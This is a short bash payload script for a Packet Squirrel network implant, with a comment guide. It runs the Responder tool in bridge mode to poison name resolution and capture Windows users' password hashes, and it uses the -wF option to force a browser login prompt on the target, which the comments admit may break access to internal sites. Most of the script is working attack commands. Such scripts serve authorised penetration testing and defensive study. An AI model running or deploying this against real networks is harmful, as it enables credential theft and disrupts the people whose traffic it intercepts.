#!/bin/bash

# Run Responder on the Packet Squirrel
# Author: Trigat.com

# Initialize by turning Purple
LED M SOLID
SLEEP 5

NETMODE BRIDGE

##### OPTIONS

LOG='/mnt/Responder-master/logs/applog.txt'

INTERFACE='eth0'             # Interface of the outgoing interface

# RESPONDER COMMAND:
python /mnt/Responder-master/Responder.py -I $INTERFACE -wF > $LOG & LED Y SOLID               
# Turn Yellow when running

#####

#####  GUIDE
#
# Install:
# Download https://github.com/SpiderLabs/Responder and copy to USB drive at:
# /mnt/Responder-master/
#
# USB drive must be plugged into Pack Squirrel.
#
# Responder logs are stored at: /mnt/Responder-master/logs
#
# Use Ethernet In port with target.
#
# You must edit the Responder command above to suit your needs.
#
# Basic Responder command:
# python /mnt/Responder-master/Responder.py -I $INTERFACE > $LOG
#
# Other Responder command options:
#
# Get Hash from Windows user when they open IE or Chrome browser.
# Target may receive a login prompt.
# This may stop users from being able to connect to internal websites properly.
# Run for a short period of time or target one individual:
# python /mnt/Responder-master/Responder.py -I $INTERFACE -wF > $LOG
#
# Analyze Mode.  Monitor without responding:
# python /mnt/Responder-master/Responder.py -I $INTERFACE -A > $LOG
#
# -wrf and -wbF are other options to test.
# -i to specify IP you forward user to.
#
#####
